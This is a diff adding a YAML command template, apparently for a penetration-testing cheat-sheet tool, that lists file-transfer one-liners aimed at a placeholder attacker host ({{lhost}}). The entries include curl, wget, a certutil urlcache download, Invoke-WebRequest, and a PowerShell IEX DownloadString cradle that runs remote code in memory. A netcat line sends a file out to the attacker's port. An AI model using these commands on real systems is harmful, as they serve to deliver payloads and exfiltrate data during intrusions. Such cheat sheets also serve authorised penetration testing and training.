@@ -1,0 +1,22 @@
+---
+tool: general
+description: General commands
+
+actions:
+  - title: curl
+    command: curl -OL http://{{lhost}}/{{file}}
+  - title: http
+    command: http://{{lhost}}/{{file}}
+  - title: https
+    command: https://{{lhost}}/{{file}}
+  - title: certutil
+    command: "certutil -urlcache -split -f http://{{lhost}}/{{file}}"
+  - title: powershell web-request
+    command: "Invoke-WebRequest http://{{lhost}}/{{file}} -OutFile {{file}}"
+  - title: powershell webclient 
+    command: "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/{{file}}')\""
+  - title: netcat
+    command: "nc -w 3 {{lhost}} {{lport}} < {{file}}"
+  - title: wget
+    command: "wget http://{{lhost}}/{{file}}"
+  
